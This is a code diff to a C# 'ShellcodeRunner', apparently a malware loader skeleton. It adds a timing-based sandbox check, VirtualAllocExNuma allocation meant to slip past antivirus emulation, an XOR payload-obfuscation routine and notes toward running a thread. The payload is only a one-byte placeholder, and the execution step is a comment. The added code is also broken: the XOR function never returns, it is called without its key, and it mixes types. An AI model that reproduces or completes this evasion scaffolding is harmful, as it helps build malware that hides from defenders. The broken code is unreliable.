@@ -29,6 +29,20 @@ namespace ShellcodeRunner
 
         [DllImport("kernel32.dll")]
         static extern IntPtr GetCurrentProcess();
+
+        static byte[] ecksore(byte[] pl, char[] key)
+        {
+            int j;
+            j = 0;  // Inefficiency on purpose!!
+            for (int i = 0; i < pl.Length; i++)
+            {
+                if (j == key.Length-1)
+                    continue;
+                pl[i] = pl[i] ^ key[j];
+                j++;
+            }
+        }
+
         static void Main(string[] args)
         {
             // Dealing with HBD
@@ -36,27 +50,25 @@ namespace ShellcodeRunner
             Sleep(2000);
             double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
             if (t2 < 1.5)
-            {
                 return;
-            }
 
-            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
-            if (mem == null)
-            {
-                return;
-            }
+            // Alloc. space
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);  // TODO: obfs. values
 
-            byte[] buf = new byte[1] {0x41};
+            // pl
+            byte[] luhmao = new byte[1] {0x41};
 
             // Dealing with SBD
-            for (int i = 0; i < buf.Length; i++)
-            {
-                buf[i] = (byte)(((uint)buf[i] - 17) & 0xFF);
-            }
+            luhmao = ecksore(luhmao);
 
             // Virtual alloc
             // Copy bytes into buffer
             // Create thread (Ex numa?)
+
+            if (mem != null)  // etc
+            {
+                // do your thing
+            }
 
         }
     }
